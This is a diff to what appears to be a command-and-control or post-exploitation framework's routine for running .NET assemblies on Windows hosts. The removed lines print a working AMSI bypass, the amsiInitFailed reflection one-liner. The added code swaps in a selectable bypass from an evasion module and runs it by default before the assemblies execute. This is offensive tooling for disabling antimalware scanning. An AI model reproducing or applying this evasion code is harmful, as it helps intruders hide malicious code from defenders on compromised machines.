@@ -7,13 +7,8 @@ from __future__ import annotations
 
 from typing import Any, Optional
 
+from lib.c2.stager_evasion import DEFAULT_AMSI_VARIANT, get_amsi_bypass
 from lib.post.windows.assembly_loader import is_dotnet_pe, resolve_assembly
-
-
-_AMSI_INIT_FAILED = (
-    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
-    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
-)
 
 
 def run_catalog_assembly(
@@ -24,6 +19,7 @@ def run_catalog_assembly(
     type_name: str = "",
     method_name: str = "Main",
     bypass_amsi: bool = True,
+    amsi_variant: str = "",
 ) -> str:
     """Resolve ``name`` from data/assemblies and run via win_run_dotnet_assembly_bytes."""
     path, meta = resolve_assembly(name)
@@ -39,7 +35,10 @@ def run_catalog_assembly(
 
     if bypass_amsi and hasattr(module, "win_run_powershell"):
         try:
-            module.win_run_powershell(_AMSI_INIT_FAILED, timeout=10)
+            module.win_run_powershell(
+                get_amsi_bypass(amsi_variant or DEFAULT_AMSI_VARIANT),
+                timeout=10,
+            )
         except Exception:
             pass
 
